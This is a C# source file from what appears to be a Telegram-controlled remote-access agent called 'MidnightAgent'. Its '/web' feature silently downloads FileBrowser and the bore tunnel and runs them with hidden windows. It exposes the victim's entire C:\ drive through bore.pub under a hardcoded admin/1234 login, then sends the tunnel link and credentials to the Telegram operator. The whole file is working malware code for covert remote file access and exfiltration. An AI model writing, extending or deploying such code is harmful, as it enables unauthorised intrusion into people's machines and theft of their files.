using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using MidnightAgent.Telegram;
using MidnightAgent.Utils;

namespace MidnightAgent.Features
{
    /// <summary>
    /// Web Feature - Deploy FileBrowser + Bore Tunnel
    /// Provides a full web-based file explorer
    /// </summary>
    public class WebFeature : IFeature
    {
        public static TelegramService TelegramInstance { get; set; }

        public string Command => "web";
        public string Description => "Start Web File Manager (FileBrowser)";
        public string Usage => "/web start | stop";

        // Configuration
        private const string FILEBROWSER_URL = "https://github.com/filebrowser/filebrowser/releases/download/v2.30.0/windows-amd64-filebrowser.zip";
        private const string BORE_URL = "https://github.com/ekzhang/bore/releases/download/v0.5.2/bore-v0.5.2-x86_64-pc-windows-msvc.zip";
        private const string BORE_SERVER = "bore.pub";
        
        private const string WEB_USER = "admin";
        private const string WEB_PASS = "1234";
        private const int INTERNAL_PORT = 8089; // Unique port for Web

        private static readonly SemaphoreSlim _lock = new SemaphoreSlim(1, 1);
        private readonly string WorkingDir = @"C:\Users\Public\MidnightWeb";
        
        private static Process _boreProcess;
        private static Process _webProcess;

        public async Task<FeatureResult> ExecuteAsync(string[] args)
        {
            if (args.Length == 0) return FeatureResult.Fail(Usage);
            string action = args[0].ToLower();

            if (action == "stop")
            {
                // Force stop regardless of lock
                await Task.Run(() => StopWeb(false));
                
                // Force release lock if it was held (reset semaphore)
                if (_lock.CurrentCount == 0)
                {
                    try { _lock.Release(); } catch { }
                }
                
                return FeatureResult.Ok("Web Server forced stop.");
            }

            if (!_lock.Wait(0))
                return FeatureResult.Fail("⚠️ Web Task is busy.");

            try
            {
                if (action == "start")
                {
                    if (TelegramInstance == null)
                    {
                        if (_lock.CurrentCount == 0)
                            try { _lock.Release(); } catch { }
                        return FeatureResult.Fail("⚠️ Agent needs restart.");
                    }

                    TelegramInstance?.SendMessage("🚀 <b>Starting Web Manager...</b>");

                    _ = Task.Run(async () =>
                    {
                        try { await StartWeb(); }
                        catch (Exception ex)
                        {
                            TelegramInstance?.SendMessage($"❌ Web Error: {ex.Message}");
                            StopWeb(true);
                        }
                        finally 
                        { 
                            // Always release lock when async task finishes
                            try { _lock.Release(); } catch { }
                        }
                    });

                    return FeatureResult.Ok("Web deployment started.");
                }
            }
            catch (Exception ex)
            {
                if (action != "start")
                {
                   try { _lock.Release(); } catch { }
                }
                return FeatureResult.Fail($"Error: {ex.Message}");
            }

            try { _lock.Release(); } catch { }
            return FeatureResult.Fail(Usage);
        }

        private async Task StartWeb()
        {
            // 1. Cleanup
            Directory.CreateDirectory(WorkingDir);
            StopWeb(true); // Ensure clean slate

            string webExe = Path.Combine(WorkingDir, "filebrowser.exe");
            string boreExe = Path.Combine(WorkingDir, "bore.exe");
            string dbPath = Path.Combine(WorkingDir, "filebrowser.db");

            // 2. Download FileBrowser
            // 2. Download FileBrowser
            if (!File.Exists(webExe))
            {
                TelegramInstance?.SendMessage("⬇️ <b>(1/4) Downloading FileBrowser...</b>");
                string zipPath = Path.Combine(WorkingDir, "filebrowser.zip");
                
                using (var client = new WebClient())
                {
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                    await client.DownloadFileTaskAsync(FILEBROWSER_URL, zipPath);
                }

                TelegramInstance?.SendMessage("📦 <b>Extracting...</b>");
                ZipFile.ExtractToDirectory(zipPath, WorkingDir);
                File.Delete(zipPath);

                // Find exe in subfolders if needed
                if (!File.Exists(webExe))
                {
                     var files = Directory.GetFiles(WorkingDir, "filebrowser.exe", SearchOption.AllDirectories);
                     if (files.Length > 0)
                     {
                         // Move to root
                         File.Move(files[0], webExe);
                     }
                }
            }

            // 3. Download Bore (if needed)
            if (!File.Exists(boreExe))
            {
                TelegramInstance?.SendMessage("⬇️ <b>(2/4) Downloading Tunnel...</b>");
                using (var client = new WebClient())
                {
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                    await client.DownloadFileTaskAsync(BORE_URL, Path.Combine(WorkingDir, "bore.zip"));
                }
                ZipFile.ExtractToDirectory(Path.Combine(WorkingDir, "bore.zip"), WorkingDir);
            }

            // 4. Configure FileBrowser
            TelegramInstance?.SendMessage("⚙️ <b>(3/4) Configuring...</b>");
            string logPath = Path.Combine(WorkingDir, "web_debug.log");
            File.WriteAllText(logPath, $"[START] {DateTime.Now}\n");
            
            if (File.Exists(dbPath)) File.Delete(dbPath);

            // Configure with logging - Put DB flag FIRST (Global flag)
            // filebrowser -d "db" config init
            RunCmd(webExe, $"-d \"{dbPath}\" config init", logPath);
            RunCmd(webExe, $"-d \"{dbPath}\" config set --address 127.0.0.1 --port {INTERNAL_PORT}", logPath);
            RunCmd(webExe, $"-d \"{dbPath}\" users add {WEB_USER} {WEB_PASS} --perm.admin", logPath);
            RunCmd(webExe, $"-d \"{dbPath}\" config set --root \"C:\\\"", logPath);

            // 5. Start FileBrowser
            TelegramInstance?.SendMessage("📂 <b>(4/4) Launching Server...</b>");
            
            var webStart = new ProcessStartInfo
            {
                FileName = webExe,
                // Remove --no-auth (invalid flag)
                // Put -d first
                Arguments = $"-d \"{dbPath}\"",
                WorkingDirectory = WorkingDir, // CRITICAL: Fixes CWD issues
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };
            
            _webProcess = new Process { StartInfo = webStart };
            
            _webProcess.OutputDataReceived += (s, e) => { if(!string.IsNullOrEmpty(e.Data)) try { File.AppendAllText(logPath, $"[WEB] {e.Data}\n"); } catch {} };
            _webProcess.ErrorDataReceived += (s, e) => { if(!string.IsNullOrEmpty(e.Data)) try { File.AppendAllText(logPath, $"[WEB ERR] {e.Data}\n"); } catch {} };
            
            _webProcess.Start();
            _webProcess.BeginOutputReadLine();
            _webProcess.BeginErrorReadLine();

            // Check if started
            if (_webProcess.WaitForExit(2000))
            {
                string error = "Process exited early";
                try { error = File.ReadAllText(logPath); } catch {}
                throw new Exception($"FileBrowser exited early. Code: {_webProcess.ExitCode}\nLog: {error}");
            }

            // 6. Start Bore Tunnel
            TelegramInstance?.SendMessage("🚇 <b>Creating Tunnel...</b>");
            string tunnelUrl = await StartBoreTunnel(boreExe);

            if (!string.IsNullOrEmpty(tunnelUrl))
            {
                 TelegramInstance?.SendMessage(
                    $"✅ <b>WEB MANAGER ONLINE</b>\n" +
                    $"✨ <i>Explore files via Browser</i>\n\n" +
                    $"🔗 <b>Link:</b> {tunnelUrl}\n" +
                    $"👤 <b>User:</b> <code>{WEB_USER}</code>\n" +
                    $"🔑 <b>Pass:</b> <code>{WEB_PASS}</code>"
                );
            }
            else
            {
                throw new Exception("Tunnel failed to connect.");
            }
        }

        private void RunCmd(string exe, string args, string logPath)
        {
            try
            {
                var info = new ProcessStartInfo
                {
                    FileName = exe,
                    Arguments = args,
                    WorkingDirectory = WorkingDir, // CRITICAL: Fixes CWD issues
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                
                using (var p = Process.Start(info))
                {
                    string outStr = p.StandardOutput.ReadToEnd();
                    string errStr = p.StandardError.ReadToEnd();
                    p.WaitForExit(5000);
                    
                    File.AppendAllText(logPath, $"[CMD] {args}\nOUT: {outStr}\nERR: {errStr}\n");
                }
            }
            catch (Exception ex)
            {
                try { File.AppendAllText(logPath, $"[CMD ERROR] {ex}\n"); } catch {}
            }
        }

        private async Task<string> StartBoreTunnel(string boreExe)
        {
            string url = null;
            
            _boreProcess = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = boreExe,
                    Arguments = $"local {INTERNAL_PORT} --to {BORE_SERVER}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true, // Capture stderr too
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };

            DataReceivedEventHandler handler = (s, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                {
                    var match = Regex.Match(e.Data, @"(http://bore\.pub:\d+)"); // Web uses http scheme usually, bore outputs it? 
                    // Bore output: "listening at bore.pub:12345"
                    // We need to construct http://bore.pub:12345
                    
                    // Regex for "bore.pub:12345"
                    var m = Regex.Match(e.Data, @"(bore\.pub:\d+)");
                    if (m.Success)
                    {
                         url = "http://" + m.Groups[1].Value;
                    }
                }
            };

            _boreProcess.OutputDataReceived += handler;
            _boreProcess.ErrorDataReceived += handler;
            
            _boreProcess.Start();
            _boreProcess.BeginOutputReadLine();
            _boreProcess.BeginErrorReadLine();
            
            // Wait for URL
            for (int i = 0; i < 30 && url == null; i++)
            {
                await Task.Delay(500);
                if (_boreProcess.HasExited) return null;
            }
            
            return url;
        }

        private void StopWeb(bool silent)
        {
            try
            {
                if (_boreProcess != null && !_boreProcess.HasExited)
                {
                    _boreProcess.Kill();
                    _boreProcess = null;
                }

                if (_webProcess != null && !_webProcess.HasExited)
                {
                    _webProcess.Kill();
                    _webProcess = null;
                }
                
                // Cleanup orphans
                foreach (var p in Process.GetProcessesByName("filebrowser"))
                    try { p.Kill(); } catch { }
                    
                foreach (var p in Process.GetProcessesByName("bore"))
                    try { if (p.MainModule.FileName.Contains("MidnightWeb")) p.Kill(); } catch { }
            }
            catch { }

            if (!silent)
                TelegramInstance?.SendMessage("🛑 <b>Web Manager Stopped</b>");
        }
    }
}
